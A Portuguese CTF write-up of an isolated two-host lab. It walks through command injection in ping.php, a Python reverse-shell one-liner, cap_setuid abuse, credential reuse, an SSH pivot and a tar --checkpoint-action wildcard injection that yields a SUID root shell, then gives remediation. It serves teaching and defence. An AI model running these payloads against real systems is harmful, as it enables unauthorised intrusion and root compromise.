
[Dificuldade](https://img.shields.io/badge/dificuldade-m%C3%A9dia-yellow) [Plataforma](https://img.shields.io/badge/plataforma-Linux%20\(Ubuntu\)-blue) [Categoria](https://img.shields.io/badge/categoria-Web%20%2B%20Lateral%20Movement%20%2B%20Privilege%20Escalation-informational)

Writeup de um CTF local (laboratório isolado) envolvendo comprometimento de um servidor de perímetro (DMZ), escalação de privilégio local, movimentação lateral até um host interno não documentado e escalação de privilégio nesse segundo host, até a obtenção de root em ambas as máquinas.

> **Nota:** laboratório fictício (Tribo Tecnologia), executado em ambiente isolado (VirtualBox, rede Host-only). Nomes de host/usuário capturados são específicos do laboratório e não representam dados reais.

## Sumário

- [Escopo e metodologia](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#escopo-e-metodologia)
- [1. Reconhecimento](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#1-reconhecimento)
- [2. Enumeração da aplicação (porta 8080)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#2-enumera%C3%A7%C3%A3o-da-aplica%C3%A7%C3%A3o-porta-8080)
- [3. Acesso Inicial — OS Command Injection](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#3-acesso-inicial--os-command-injection)
- [4. Foothold — Shell Reversa](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#4-foothold--shell-reversa)
- [5. Escalação de Privilégio — Root (web01)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#5-escala%C3%A7%C3%A3o-de-privil%C3%A9gio--root-web01)
- [6. Movimentação Lateral — web01 → app02](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#6-movimenta%C3%A7%C3%A3o-lateral--web01--app02)
- [7. Escalação de Privilégio — Root (app02)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#7-escala%C3%A7%C3%A3o-de-privil%C3%A9gio--root-app02)
- [8. Flags](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#8-flags)
- [Causas raiz e recomendações](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#causas-raiz-e-recomenda%C3%A7%C3%B5es)

---

## Escopo e metodologia

**Objetivo:** comprometer o servidor de perímetro (DMZ), obter root, descobrir e alcançar um host interno não documentado por movimentação lateral, escalar privilégios também nele e capturar a flag final.

**Ambiente:** dois hosts isolados em laboratório (rede Host-only + rede interna segregada), executados via VirtualBox — `web01` (perímetro, 192.168.56.10) e `app02` (interno, 192.168.57.20).

**Metodologia:** condução manual, seguindo as etapas clássicas de uma avaliação ofensiva — reconhecimento, enumeração, exploração, pós-exploração, movimentação lateral e escalação de privilégio — sem uso de scanners automatizados de exploração.

**Ferramentas:** Nmap, feroxbuster, Netcat, Python3, SSH.

|Etapa|Técnica|
|---|---|
|Reconhecimento|ARP scan + Nmap (portas e versões) + feroxbuster|
|Acesso inicial|OS Command Injection em `ping.php`|
|Pós-exploração|Shell reversa (Python)|
|Escalação de privilégio (web01)|Abuso de Linux capability `cap_setuid`|
|Movimentação lateral|Reuso de credencial + `ssh -D` até a rede interna|
|Escalação de privilégio (app02)|`tar` wildcard injection em automação privilegiada (systemd timer)|

---

## 1. Reconhecimento

Confirmação da interface de rede do atacante e identificação do alvo via ARP scan:

```bash
ifconfig
```

![[01-ifconfig.png]]

ARP scan confirmando o host 192.168.56.10

![[02-arp-scan.png]]

Varredura completa de portas:

```bash
nmap -p- --min-rate 1600 -T5 -Pn 192.168.56.10
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

![[03-nmap-p-all.png]]

Detecção de versão dos serviços:

```bash
nmap -sV -T5 192.168.56.10
```

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
8080/tcp open  http-proxy Apache httpd 2.4.58 (Ubuntu)
```

![[04-nmap-sV.png]]

**Por que a 8080, e não 80:** a porta 80 respondia com o site institucional estático da "Tribo Tecnologia", sem nada de interativo. Já a porta 8080 expunha um Apache com um "Portal de Operações" — indicação de que ali estava a superfície de ataque real, por trás de algo parecido com um proxy reverso interno.

---

## 2. Enumeração da aplicação (porta 8080)

Varredura de diretórios na porta 8080:

```bash
feroxbuster -u http://192.168.56.10:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![[05-feroxbuster.png]]

Encontrado o diretório `/tools/` com listagem de diretório habilitada (status 200), expondo o arquivo `ping.php` — uma ferramenta de diagnóstico de conectividade.

![[06-index-tools.png]]

Página web do ping.php — formulário de "Verificação de conectividade"

![[07-pingphp-page.png]]

---

## 3. Acesso Inicial — OS Command Injection

O `ping.php` aceitava um parâmetro `host` e refletia a execução de um `ping` no servidor, sem nenhuma sanitização — um cenário clássico de OS Command Injection.

Entrada usada no campo `host`:

```
192.168.56.10 & whoami
```

![[08-command-injection-confirm.png]]

Confirmado: o comando injetado executa como `www-data`.

---

## 4. Foothold — Shell Reversa

Listener na máquina atacante, ANTES de disparar o payload:

```bash
nc -lvnp 4444
```

Payload de shell reversa em Python (`socket` + `pty.spawn`), montado e enviado pelo mesmo campo `host`:

![[09-python-payload.png]]

```
192.168.56.10 & python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

![[10-reverse-shell.png]]

Estabilização da shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Por que Python e não `nc -e`:** o `nc` instalado no alvo não tinha suporte à flag `-e` (comum em builds "seguras" por padrão). Python já estava disponível no sistema (é inclusive a base do vetor de privesc explorado mais adiante), então montar o payload em Python — abrindo um socket bruto e redirecionando stdin/stdout/stderr para ele — contornou essa limitação sem precisar de ferramentas adicionais.

---

## 5. Escalação de Privilégio — Root (web01)

### Coleta de credenciais

SUID (`find / -perm -u=s -type f`) e `sudo -l` foram verificados como `www-data` e não revelaram nada além de binários padrão do sistema.

Busca por configurações da aplicação:

```bash
find / -name "config.php" -type f 2>/dev/null
cat /var/www/vulnapp/config.php
```

![[11-config-php.png]]

Credencial encontrada: usuário `webapp`, senha `Trib0Web!2024`.

```bash
cat /etc/passwd
```

![[12-etc-passwd.png]]

Revelou os usuários `fiap` e `jdias`. A credencial encontrada foi testada contra `jdias`:

```bash
su - jdias
# senha: Trib0Web!2024
```

![[13-su-jdias.png]]

Confirmado **reuso de credencial**: a senha do banco de dados também era a senha do sistema para `jdias`.

### O vetor: Linux capability cap_setuid

Descartados SUID, `sudo -l`, diretórios/arquivos graváveis e crontab (`/etc/cron.d|daily|hourly`) como `jdias` — todos padrão do sistema. Próximo vetor investigado: capabilities.

```bash
getcap -r / 2>/dev/null
```

![[14-getcap-pycheck.png]]

`getcap -r /` revelou o vetor real: `/opt/maintenance/pycheck` com a capability `cap_setuid=ep`.

**Por que isso é explorável:** essa capability permite que o processo chame `setuid()` para qualquer UID, incluindo root, sem precisar de SUID ou sudo. Como o `pycheck` é um interpretador Python standalone, qualquer código Python executado dentro dele herda essa capability — bastou chamar `os.setuid(0)` e trocar de processo:

```bash
/opt/maintenance/pycheck -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Confirmado acesso root completo no web01.

---

## 6. Movimentação Lateral — web01 → app02

### Descoberta da rede interna

Com root no web01, `ip a` revelou uma segunda interface (`enp0s8`) conectando o host a uma rede interna isolada: `192.168.57.0/24`.

![[15-ip-a-root.png]]

Ping sweep manual (sem Nmap disponível no alvo):

```bash
for i in {1..254}; do (ping -c 1 -W 1 192.168.57.$i | grep "64 bytes" &); done
```

Identificado o host vivo `192.168.57.20`. Varredura de portas via `nc`:

```bash
for p in {1..65535}; do (nc -zvw1 192.168.57.20 $p 2>&1 | grep -E "open|succeeded"); done
```


![[16-nc-port-scan.png]]

### Pivô via SSH -D

Acesso ao app02 autenticando com a credencial reutilizada, executado de dentro da sessão root do web01 (que já tinha rota direta para a rede interna):

```bash
ssh -D 0.0.0.0:1080 jdias@192.168.57.20
# senha: Trib0Web!2024
```

![[17-ssh-D-login.png]]

**Por que não foi necessário um túnel dedicado (Chisel, etc.):** o próprio web01 comprometido já enxergava a rede interna diretamente, então bastou rodar o cliente SSH de dentro dessa sessão — sem precisar redirecionar portas para a máquina atacante.

---

## 7. Escalação de Privilégio — Root (app02)

### Enumeração

Como `jdias`: SUID, `sudo -l`, arquivos/diretórios graváveis e crontab/cron.d/daily/hourly descartados — todos padrão do sistema. `getcap -r /` não revelou nada incomum neste host, diferente do web01.

Com os vetores clássicos de privesc descartados, o próximo passo foi investigar automações privilegiadas do sistema (systemd timers/services) — um padrão comum de misconfiguration em ambientes corporativos.

### O vetor: tar wildcard injection

```bash
cat /etc/systemd/system/backup.timer
cat /etc/systemd/system/backup.service
cat /usr/local/sbin/run_backup.sh
```

![[18-systemd-timer-cat.png]]

- `backup.timer`: dispara a cada 2 minutos (`OnUnitActiveSec=2min`)
- `backup.service`: roda como **root** (`User=root`), executando `run_backup.sh`
- `run_backup.sh`:

```bash
cd /home/jdias/reports || exit 1
/usr/bin/tar czf /opt/backups/reports-latest.tgz *
```

O diretório `/home/jdias/reports` era de propriedade de `jdias`:

```bash
ls -la /home/jdias/reports
```

![[19-ls-reports.png]]

**Por que isso é explorável:** o `tar` é executado com um curinga (`*`) dentro de um diretório controlado por um usuário de baixo privilégio. Quem expande esse `*` é o shell, antes do `tar` rodar — e se um dos "arquivos" no diretório tiver um nome começando com `--`, o shell ainda assim o inclui na lista de argumentos, fazendo o `tar` interpretá-lo como uma flag de linha de comando em vez de um arquivo.

### Exploração

```bash
cd /home/jdias/reports
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > payload.sh
chmod +x payload.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
```

`--checkpoint` e `--checkpoint-action` são opções reais do GNU tar (normalmente usadas para mostrar progresso em backups grandes). `--checkpoint-action=exec=COMANDO` instrui o tar a executar um comando a cada checkpoint — e como os "nomes de arquivo" criados acima são na verdade essas flags, o `tar` (rodando como root via o timer) acaba executando `payload.sh` com privilégios de root.

No próximo disparo do timer, `/tmp/rootbash` foi criado com SUID de root:

![[20-rootbash.png]]

```bash
/tmp/rootbash -p
whoami
cat /root/root.txt
```

`/tmp/rootbash -p` → shell root confirmada (`whoami` → `root`).

---

## 8. Flags

```bash
cat /root/root.txt
```

![[21-root-flag.png]]

|Etapa|Host|Flag|
|---|---|---|
|Foothold|web01|`FLAG{A-foothold-7c1e9b}`|
|Root|web01|`FLAG{A-root-91b6c4}`|
|Usuário (user.txt)|app02|`FLAG{B-user-5d2e77}`|
|Root final (root.txt)|app02|_flag final_|

Flags capturadas com sucesso, confirmando o comprometimento total de ambos os hosts.

---

## Causas raiz e recomendações

### Achado 1 — OS Command Injection (CWE-78)

**Severidade:** Crítica · **Localização:** `GET /tools/ping.php?host=<entrada>`

**Causa raiz:** o parâmetro `host` é repassado sem sanitização para uma chamada de shell (`system()`/equivalente), permitindo encadear comandos arbitrários via `&`, `;` ou `|`.

**Impacto:** execução remota de código não autenticada, viabilizando o acesso inicial (`www-data`).

**Recomendação:**

- Eliminar a construção dinâmica de comandos de shell a partir de entrada do usuário.
- Validar rigorosamente o formato esperado (ex.: regex de IPv4) antes de qualquer processamento.
- Usar chamadas de sistema parametrizadas (`exec` com array de argumentos), nunca concatenação de string.

### Achado 2 — Uso indevido de Linux Capabilities (CWE-250)

**Severidade:** Alta · **Localização:** `/opt/maintenance/pycheck` (`cap_setuid=ep`)

**Causa raiz:** um interpretador Python de propósito geral recebeu a capability `cap_setuid`, permitindo que qualquer usuário capaz de executá-lo altere seu UID efetivo para root.

**Impacto:** escalação de privilégio local de `www-data`/`jdias` para root no web01.

**Recomendação:**

- Remover capabilities desnecessárias de binários, especialmente `cap_setuid`.
- Evitar manter interpretadores de propósito geral com privilégios elevados acessíveis a serviços web.
- Auditar periodicamente o sistema com `getcap -r /`.

### Achado 3 — Credenciais em texto claro e reuso de credenciais (CWE-798 / CWE-521)

**Severidade:** Alta · **Localização:** `config.php` (web01) e conta SSH `jdias` (app02)

**Causa raiz:** credencial de banco de dados armazenada em texto claro em arquivo de configuração, e a mesma senha reutilizada como senha de sistema em duas máquinas distintas.

**Impacto:** vazamento de credencial que, por reuso, viabilizou tanto a escalação local (`su - jdias`) quanto a movimentação lateral até o app02.

**Recomendação:**

- Nunca armazenar credenciais em texto claro em código-fonte ou arquivos de configuração versionados; usar cofres de segredos (vault) ou variáveis de ambiente protegidas.
- Impor política de não reuso de senhas entre sistemas e contas de serviço distintas.

### Achado 4 — Segmentação de rede insuficiente (CWE-668)

**Severidade:** Alta · **Localização:** rede interna `192.168.57.0/24`, alcançável diretamente a partir do web01

**Causa raiz:** o host interno app02 era alcançável sem controles adicionais a partir do servidor de perímetro comprometido.

**Impacto:** um único host de perímetro comprometido deu acesso de rede total a um sistema interno que nunca deveria estar exposto.

**Recomendação:**

- Reforçar a segmentação de rede entre DMZ e rede interna, com firewall e regras explícitas de menor privilégio.
- Monitorar/alertar sobre conexões não previstas partindo de hosts de perímetro para redes internas.

### Achado 5 — Tar wildcard injection em automação privilegiada (CWE-88)

**Severidade:** Alta · **Localização:** `backup.timer`/`run_backup.sh` (app02, executado como root)

**Causa raiz:** rotina de backup privilegiada (systemd timer rodando como root) executa `tar` com curinga (`*`) sobre um diretório gravável por um usuário não privilegiado.

**Impacto:** escalação de privilégio local de `jdias` para root no app02.

**Recomendação:**

- Evitar o uso de curingas (`*`) em comandos `tar`/`chmod`/`chown` executados por rotinas privilegiadas sobre diretórios graváveis por usuários não privilegiados.
- Usar caminhos explícitos ou a flag `--` para encerrar o parsing de opções.
- Rodar rotinas de automação com o menor privilégio necessário, nunca como root por padrão.

### Síntese

A cadeia completa foi viabilizada pela combinação de falhas individualmente moderadas em dois hosts distintos — nenhuma delas, isolada, seria classificada como crítica sozinha, mas a soma permitiu o caminho completo do perímetro público até root em um sistema interno que nunca deveria ter sido alcançável. Prioridade para o **Achado 1** (RCE não autenticado), maior impacto imediato e ponto de entrada de toda a cadeia.

---

## Disclaimer

Laboratório de estudo, executado em ambiente isolado e autorizado. As técnicas aqui descritas não devem ser aplicadas contra sistemas sem autorização explícita.